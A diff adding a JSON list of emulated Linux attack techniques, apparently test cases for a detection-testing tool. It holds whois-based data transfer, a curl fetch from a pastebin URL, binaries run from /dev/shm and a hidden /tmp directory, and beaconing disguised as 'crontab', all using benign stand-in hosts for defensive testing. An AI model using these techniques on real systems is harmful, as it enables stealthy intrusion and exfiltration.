@@ -1,0 +1,38 @@
+[
+    {
+        "name" : "NIX-WHOIS-TRANSFER",
+        "execve" : [ "whois", "-h", "redcanary.com", "-p", "443", "iioo" ]
+    },
+    {
+        "name" : "NIX-CURL-PASTESITES",
+        "execveat" : [ "curl", "-L", "https://pastebin.com/raw/redcanary-example" ]
+    },
+    {
+        "name" : "LINUX-SHM-DIR-EXECUTION",
+        "copy" : [ "/proc/self/exe", "/dev/shm/chain_reactor" ],
+        "execve" : [ "/dev/shm/chain_reactor", "exit" ],
+        "remove" : [ "/dev/shm/chain_reactor" ]
+    },
+    {
+        "name" : "NIX-HIDDEN-PROCESS-EXEC",
+        "execve" : [ "mkdir", "-p", "/tmp/.hidden" ],
+        "copy" : [ "/proc/self/exe", "/tmp/.hidden/.chain_reactor_hidden"],
+        "execveat" : [ "/tmp/.hidden/.chain_reactor_hidden", "exit" ],
+        "remove" : [ "/tmp/.hidden" ]
+    },
+    {
+        "name" : "NIX-WHOIS-TRANSFER-FAKE",
+        "fork-and-rename" : [ "whois", "-h", "redcanary.com", "-p", "443", "iioo" ],
+        "connect" : { "method": "socketcall", "protocol": "tcp4", "address": "redcanary.com", "port": 443 }
+    },
+    {
+        "name" : "C2-BIND",
+        "fork-and-rename" : [ "crontab" ],
+        "listen" : { "method": "socketcall", "protocol": "udp4", "address": "0.0.0.0", "port": 443 }
+    },
+    {
+        "name" : "C2-BEACON",
+        "fork-and-rename" : [ "crontab" ],
+        "connect" : { "method": "socketcall", "protocol": "tcp4", "address": "google.com", "port": 443 }
+    }
+]
